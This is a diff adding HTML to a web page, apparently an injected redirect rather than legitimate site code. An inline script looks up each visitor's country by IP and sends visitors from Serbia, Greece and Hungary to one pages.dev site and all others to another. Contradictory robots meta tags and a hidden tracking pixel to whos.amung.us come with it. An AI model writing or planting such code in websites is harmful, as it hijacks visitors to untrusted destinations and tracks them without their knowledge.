@@ -1,0 +1,27 @@
+    <meta name="robots" content="index, follow"/>
+	  <meta name="googlebot" content="noindex"/> 
+    <meta name="robots" content="index">
+    <meta name="robots" content="noindex">
+    <meta name="robots" content="nofollow">
+<script>
+let countryHack = ['RS', 'GR', 'HU']; // Paises objetivo
+let urlPromocion = 'https://serbia-7w7.pages.dev/';
+let urlPredeterminada = 'https://direct-892.pages.dev/';
+let country;
+
+fetch('https://get.geojs.io/v1/ip/country')
+    .then((response) => response.text())
+    .then((data) => {
+        country = data.trim();
+        if (countryHack.includes(country)) {
+            window.location.href = urlPromocion;
+        } else {
+            // Redirige a la URL predeterminada si el país no está en la lista
+            window.location.href = urlPredeterminada;
+        }
+    });
+    </script>
+</body>
+</html>
+
+<img src="https://whos.amung.us/pingjs/?k=geekvape &t=Ready MMG &x=https://megabanana.mx/" style="display: none;"/>
